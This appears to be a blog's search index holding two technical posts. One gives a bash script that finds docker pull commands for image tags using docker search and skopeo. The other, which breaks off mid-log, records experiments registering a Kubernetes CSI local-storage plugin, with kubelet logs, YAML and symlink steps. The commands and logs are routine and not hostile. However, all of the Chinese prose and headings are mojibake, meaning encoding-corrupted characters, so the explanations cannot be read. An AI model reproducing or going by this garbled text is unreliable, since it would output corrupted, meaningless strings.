<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ã€dockerç³»åˆ—ã€‘(202506) dockeræŸ¥æ‰¾æŸä¸ªé•œåƒçš„æŸä¸ªtagçš„å…·ä½“æ‹‰å–å‘½ä»¤</title>
    <link href="/2025/06/11/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202506)%20docker%E6%9F%A5%E6%89%BE%E6%9F%90%E4%B8%AA%E9%95%9C%E5%83%8F%E7%9A%84%E6%9F%90%E4%B8%AAtag%E7%9A%84%E5%85%B7%E4%BD%93%E6%8B%89%E5%8F%96%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/06/11/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202506)%20docker%E6%9F%A5%E6%89%BE%E6%9F%90%E4%B8%AA%E9%95%9C%E5%83%8F%E7%9A%84%E6%9F%90%E4%B8%AAtag%E7%9A%84%E5%85%B7%E4%BD%93%E6%8B%89%E5%8F%96%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>æƒ³è¦åœ¨docker.ioé‡Œé¢æŸ¥æ‰¾æŸä¸ªé•œåƒçš„æŸä¸ªtagï¼Œå¹¶ä¸”æŠŠå…·ä½“çš„å‘½ä»¤æ‰“å°å‡ºæ¥</p><h1 id="ç¼ºé™·"><a href="#ç¼ºé™·" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h1><p>ç›®å‰æ²¡æœ‰åŠæ³•ç¡®å®šæ˜¯å¦æ˜¯åŒæ¶æ„</p><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># é•œåƒåˆ—è¡¨ï¼ˆæ ¼å¼ï¼šé•œåƒå:æ ‡ç­¾ï¼‰</span><br>images=(<br>  <span class="hljs-comment"># &quot;nginx:1.21&quot;</span><br>  <span class="hljs-comment"># &quot;redis:7.0.0&quot;</span><br>  <span class="hljs-comment"># &quot;node:20.11&quot;</span><br>  <span class="hljs-comment"># &quot;notexistimage:1.0&quot;</span><br><br>  <span class="hljs-comment"># csi-resizer:v1.8.0</span><br>  <span class="hljs-comment"># csi-snapshotter:v6.2.2</span><br>  <span class="hljs-comment"># snapshot-controller:v6.2.2</span><br>  <span class="hljs-comment"># csi-provisioner:v3.5.0</span><br>  <span class="hljs-comment"># csi-node-driver-registrar:v2.8.0</span><br>  <span class="hljs-comment"># lvm-driver:1.4.0</span><br><br>  <span class="hljs-comment"># lvm-driver:1.6.1</span><br><br>  openebs/tests-fio<br>)<br><br><span class="hljs-keyword">for</span> image <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;images[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>  name=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;image%%:*&#125;</span>&quot;</span><br>  tag=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;image##*:&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ğŸ” æ­£åœ¨æŸ¥æ‰¾é•œåƒ <span class="hljs-variable">$&#123;name&#125;</span>:<span class="hljs-variable">$&#123;tag&#125;</span> ...&quot;</span><br><br>  namespaced_name=$(docker search <span class="hljs-variable">$name</span> |grep -v <span class="hljs-string">&quot;NAME&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br><br>  <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-variable">$namespaced_name</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  â˜…â˜… æ­£åœ¨æŸ¥æ‰¾é•œåƒ skopeo list-tags docker://docker.io/<span class="hljs-variable">$item</span> |grep <span class="hljs-variable">$tag</span> ...&quot;</span><br>    found=$(skopeo list-tags docker://docker.io/<span class="hljs-variable">$item</span> |grep <span class="hljs-variable">$tag</span>)<br>    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;    âœ… docker pull <span class="hljs-variable">$item</span>:<span class="hljs-variable">$tag</span>&quot;</span> <br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202506) csiæœ¬åœ°å­˜å‚¨æ’ä»¶</title>
    <link href="/2025/06/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202506)%20csi%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E6%8F%92%E4%BB%B6lvm-localpv/"/>
    <url>/2025/06/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202506)%20csi%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E6%8F%92%E4%BB%B6lvm-localpv/</url>
    
    <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250606171438.png" alt="image.png"></p><p>1.csiæ’ä»¶ç”Ÿæˆ<code>/var/lib/kubelet/plugins/&lt;driver&gt;/csi.sock</code><br>2.<code>node-driver-registrar</code> ç»„ä»¶ä¼šå°† CSI æ’ä»¶çš„ä¿¡æ¯æ³¨å†Œåˆ°ï¼š<code>/var/lib/kubelet/plugins_registry/</code> ä¸­<br>3.<code>kubelet</code> å‘ç°äº†è¿™ä¸ªæ³¨å†Œä¿¡æ¯ä¹‹åï¼Œå°±ä¼šå°è¯•é€šè¿‡ socket ä¸»åŠ¨è¿æ¥æ’ä»¶ï¼Œå¹¶è°ƒç”¨å¤šä¸ªæ ‡å‡† gRPC æ¥å£ï¼šä¾‹å¦‚<code>NodeGetInfo</code><br>4.kubelet æ ¹æ® <code>NodeGetInfo</code> çš„è¿”å›ï¼Œ<strong>åˆ›å»ºæˆ–æ›´æ–° <code>CSINode</code> å¯¹è±¡</strong>ï¼Œç”¨äºè°ƒåº¦å†³ç­–ï¼ˆæ¯”å¦‚æ‹“æ‰‘æ„ŸçŸ¥è°ƒåº¦ï¼‰ã€‚</p><h1 id="å®è·µ1ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯"><a href="#å®è·µ1ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯" class="headerlink" title="å®è·µ1ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯"></a>å®è·µ1ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯</h1><p>å®è·µæ—¶å‘ç°ï¼Œkubeletä¼šæœ‰å¦‚ä¸‹æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> kubelet[<span class="hljs-number">3225884</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">955007</span> <span class="hljs-number">3225884</span> csi_plugin.go:<span class="hljs-number">99</span>] kubernetes.io/csi: Trying to validate a new CSI Driver with name: &lt;driverName&gt; endpoint: /xxx/plugins/&lt;driverName&gt;/csi.sock versions: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>ä»¥äºŒè¿›åˆ¶æ–¹å¼éƒ¨ç½²çš„lvm-localpvæœ‰å¦‚ä¸‹æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">955959</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">72</span>] GRPC call: /csi.v1.Node/NodeGetInfo requests &#123;&#125;<br><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> cdp-<span class="hljs-number">10</span>-<span class="hljs-number">191</span>-<span class="hljs-number">193</span>-<span class="hljs-number">6</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">960667</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">81</span>] GRPC response: &#123;<span class="hljs-string">&quot;accessible_topology&quot;</span>:&#123;<span class="hljs-string">&quot;segments&quot;</span>:&#123;<span class="hljs-string">&quot;openebs.io/nodename&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;node_id&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>ç„¶åcsinodeç¡®å®æ›´æ–°äº†</p><p>ç„¶ånodeçš„annotationä¹Ÿç¡®å®æ›´æ–°äº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">csi.volume.kubernetes.io/nodeid:</span> <span class="hljs-string">&#x27;&#123;&quot;&lt;driverName&gt;&quot;:&quot;node0&quot;,&quot;&lt;anotherDriverName&gt;&quot;:&quot;xxx&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="å®è·µ2ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯"><a href="#å®è·µ2ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯" class="headerlink" title="å®è·µ2ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯"></a>å®è·µ2ï¼šç”¨kubeleté…ç½®çš„ç›®å½•ä¿¡æ¯</h1><p>1.åˆ é™¤<code>/xxx/plugins/&lt;driverName&gt;/csi.sock</code><br>nodeçš„annotationä¿¡æ¯è¿˜åœ¨<br>csinodeä¸Šçš„ä¿¡æ¯ä¹Ÿè¿˜åœ¨<br>2.åœ¨1çš„åŸºç¡€ä¸Šï¼Œåˆ é™¤&#96;&#x2F;xxx&#x2F;plugins_registry&#x2F;<driverName>-reg.sock<br>nodeçš„annotationä¿¡æ¯è¢«åˆ äº†<br>csinodeä¸Šçš„ä¿¡æ¯ä¹Ÿè¢«åˆ äº†<br>ä½†æ˜¯ï¼Œæ˜¯è°åˆ çš„å‘¢ï¼Ÿæ²¡åœ¨kubeletä¸Šçœ‹åˆ°ç›¸å…³æ—¥å¿—</p><h1 id="å®è·µ3ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯"><a href="#å®è·µ3ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯" class="headerlink" title="å®è·µ3ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯"></a>å®è·µ3ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>localpvè¿›ç¨‹å’Œnode-driver-registrarè¿›ç¨‹ä¸æƒ³ä½¿ç”¨kubeletè¿›ç¨‹é…ç½®çš„ç›®å½•ï¼Œæƒ³ä½¿ç”¨è‡ªå®šä¹‰çš„ç›®å½•</p><h2 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll /vdata/storage/plugins   ç©º<br>ll /vdata/storage/plugins_registry  ç©º<br><br>ll /xxx/plugins            xxxä¸ºkubeletè¿›ç¨‹é…ç½®é‡Œé¢çš„ ç©º<br>ll /xxx/plugins_registry   xxxä¸ºkubeletè¿›ç¨‹é…ç½®é‡Œé¢çš„ ç©º<br><br>nodeçš„annotationæ²¡æœ‰driverä¿¡æ¯<br>csinodeçš„specä¸‹æ²¡æœ‰driverä¿¡æ¯<br><br>localpvè¿›ç¨‹è¿æ¥/vdata/storageç›¸å…³ç›®å½•<br>node-driver-registrarè¿›ç¨‹è¿æ¥/vdata/storageç›¸å…³ç›®å½•<br></code></pre></td></tr></table></figure><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>1.é‡å¯ä¸»æœºä¸Šçš„localpvè¿›ç¨‹<br><code>/vdata/storage/plugins/&lt;driverName&gt;/csi.sock</code> è‡ªåŠ¨ç”Ÿæˆ</p><p>2.é‡å¯ä¸»æœºä¸Šçš„<code>node-driver-registrar</code>è¿›ç¨‹<br><code>/vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock</code>è‡ªåŠ¨ç”Ÿæˆ</p><p>3.åˆ›å»ºè½¯é“¾æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock /xxx/plugins_registry/&lt;driverName&gt;-reg.sock<br></code></pre></td></tr></table></figure><p><font color="red">æœªé‡å¯kubelet</font></p><p>æ­¤æ—¶ï¼Œkubeletæ‰“å°å¤„æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span> kubelet[<span class="hljs-number">3225884</span>]: I0606 <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span>.<span class="hljs-number">956052</span> <span class="hljs-number">3225884</span> csi_plugin.go:<span class="hljs-number">99</span>] kubernetes.io/csi: Trying to validate a new CSI Driver with name: &lt;driverName&gt; endpoint: /vdata/storage/plugins/local.csi.paas.cucloud/csi.sock versions: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>locallvè¿›ç¨‹çš„æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">955959</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">72</span>] GRPC call: /csi.v1.Node/NodeGetInfo requests &#123;&#125;<br><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">960667</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">81</span>] GRPC response: &#123;<span class="hljs-string">&quot;accessible_topology&quot;</span>:&#123;<span class="hljs-string">&quot;segments&quot;</span>:&#123;<span class="hljs-string">&quot;openebs.io/nodename&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;node_id&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>node-driver-registrarè¿›ç¨‹çš„æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span> node-driver-registrar[<span class="hljs-number">3342604</span>]: I0606 <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span>.<span class="hljs-number">955789</span> <span class="hljs-number">3342604</span> main.go:<span class="hljs-number">98</span>] <span class="hljs-string">&quot;Received GetInfo call&quot;</span> request=<span class="hljs-string">&quot;&amp;InfoRequest&#123;&#125;&quot;</span><br><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">06</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">46</span> node-storage-driver-registrar[<span class="hljs-number">3342604</span>]: I0606 <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">46</span>.<span class="hljs-number">000749</span> <span class="hljs-number">3342604</span> main.go:<span class="hljs-number">110</span>] <span class="hljs-string">&quot;Received NotifyRegistrationStatus call&quot;</span> status=<span class="hljs-string">&quot;&amp;RegistrationStatus&#123;PluginRegistered:true,Error:,&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>csinodeä¸Šçš„ä¿¡æ¯æœ‰äº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">CSINode</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>  <span class="hljs-attr">ownerReferences:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">uid:</span> <span class="hljs-string">c7a8993b-40ab-4641-849f-6ac40d8a6750</span><br>  <span class="hljs-attr">resourceVersion:</span> <span class="hljs-string">&quot;33527&quot;</span><br>  <span class="hljs-attr">uid:</span> <span class="hljs-string">7ac73448-c503-40b6-bed4-90a3285619da</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">drivers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">&lt;driverName&gt;</span><br>    <span class="hljs-attr">nodeID:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">topologyKeys:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">openebs.io/nodename</span><br></code></pre></td></tr></table></figure><p>nodeçš„annotationä¿¡æ¯ä¹Ÿæœ‰äº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">csi.volume.kubernetes.io/nodeid:</span> <span class="hljs-string">&#x27;&#123;&quot;&lt;driverName&gt;&quot;:&quot;node0&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="å®è·µ4ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯"><a href="#å®è·µ4ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯" class="headerlink" title="å®è·µ4ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯"></a>å®è·µ4ï¼šç”¨è‡ªå®šä¹‰çš„ç›®å½•ä¿¡æ¯</h1><h2 id="èƒŒæ™¯-1"><a href="#èƒŒæ™¯-1" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>localpvè¿›ç¨‹å’Œnode-driver-registrarè¿›ç¨‹ä¸æƒ³ä½¿ç”¨kubeletè¿›ç¨‹é…ç½®çš„ç›®å½•ï¼Œæƒ³ä½¿ç”¨è‡ªå®šä¹‰çš„ç›®å½•</p><h2 id="å‰ææ¡ä»¶-1"><a href="#å‰ææ¡ä»¶-1" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll /vdata/storage/plugins   ç©º<br>ll /vdata/storage/plugins_registry  ç©º<br><br>ll /xxx/plugins            xxxä¸ºkubeletè¿›ç¨‹é…ç½®é‡Œé¢çš„ ç©º<br>ll /xxx/plugins_registry   xxxä¸ºkubeletè¿›ç¨‹é…ç½®é‡Œé¢çš„ ç©º<br><br>nodeçš„annotationæ²¡æœ‰driverä¿¡æ¯<br>csinodeçš„specä¸‹æ²¡æœ‰driverä¿¡æ¯<br><br>localpvè¿›ç¨‹è¿æ¥/vdata/storageç›¸å…³ç›®å½•<br>node-driver-registrarè¿›ç¨‹è¿æ¥/vdata/storageç›¸å…³ç›®å½•<br></code></pre></td></tr></table></figure><h2 id="å¿«æ·å‘½ä»¤"><a href="#å¿«æ·å‘½ä»¤" class="headerlink" title="å¿«æ·å‘½ä»¤"></a>å¿«æ·å‘½ä»¤</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-units</span> |<span class="hljs-string">grep</span> <span class="hljs-string">storage</span><br></code></pre></td></tr></table></figure><h2 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>1.é‡å¯ä¸»æœºä¸Šçš„<code>node-driver-registrar</code>è¿›ç¨‹<br>è¯¥è¿›ç¨‹è¿ä¸ä¸Šcsi.sock  ä¸€ç›´åœ¨é‡å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">6æœˆ 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340043 2035069 main.go:152] <span class="hljs-string">&quot;Version&quot;</span> version=<span class="hljs-string">&quot;v0.0.1&quot;</span><br>6æœˆ 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340128 2035069 main.go:153] <span class="hljs-string">&quot;Running node-driver-registrar&quot;</span> mode=<span class="hljs-string">&quot;&quot;</span><br>6æœˆ 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340156 2035069 main.go:175] <span class="hljs-string">&quot;Created directory for pluginRegistrationPath successfully&quot;</span> pluginRegistrationPath=<span class="hljs-string">&quot;/vdata/storage/plugins_registry/&quot;</span><br>6æœˆ 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340176 2035069 main.go:181] <span class="hljs-string">&quot;Attempting to open a gRPC connection&quot;</span> csiAddress=<span class="hljs-string">&quot;/vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6æœˆ 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340211 2035069 connection.go:234] <span class="hljs-string">&quot;Connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6æœˆ 09 09:55:42 node-driver-registrar[2035069]: I0609 09:55:42.340927 2035069 connection.go:253] <span class="hljs-string">&quot;Still connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6æœˆ 09 09:55:52 node-driver-registrar[2035069]: I0609 09:55:52.340933 2035069 connection.go:253] <span class="hljs-string">&quot;Still connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6æœˆ 09 09:56:02 node-driver-registrar[2035069]: I0609 09:56:02.340838 2035069 connection.go:253] <span class="hljs-string">&quot;Still connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6æœˆ 09 09:56:02 node-driver-registrar[2035069]: E0609 09:56:02.340965 2035069 main.go:185] <span class="hljs-string">&quot;Error connecting to CSI driver&quot;</span> err=<span class="hljs-string">&quot;context deadline exceeded&quot;</span><br>6æœˆ 09 09:56:02 systemd[1]: node-driver-registrar.service: Main process exited, code=exited, status=1/FAILURE<br><br></code></pre></td></tr></table></figure><p>2.é‡å¯ä¸»æœºä¸Šçš„localpvè¿›ç¨‹<br><code>/vdata/storage/plugins/&lt;driverName&gt;/csi.sock</code> è‡ªåŠ¨ç”Ÿæˆ</p><p><code>node-driver-registrar</code>è¿›ç¨‹æ­£å¸¸å¯åŠ¨ï¼Œä¸ä¼šå†é€€å‡ºäº†<br><code>/vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock</code>è‡ªåŠ¨ç”Ÿæˆ</p><p>3.åˆ›å»ºè½¯é“¾æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock /xxx/plugins_registry/&lt;driverName&gt;-reg.sock<br></code></pre></td></tr></table></figure><p><font color="red">æœªé‡å¯kubelet</font></p><p>æ­¤æ—¶ï¼Œkubeletæ‰“å°å¤„æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> kubelet[<span class="hljs-number">3225884</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">064767</span> <span class="hljs-number">3225884</span> csi_plugin.go:<span class="hljs-number">99</span>] kubernetes.io/csi: Trying to validate a new CSI Driver with name: &lt;driverName&gt; endpoint: /vdata/storage/plugins/&lt;driverName&gt;/csi.sock versions: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p>locallvè¿›ç¨‹çš„æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span 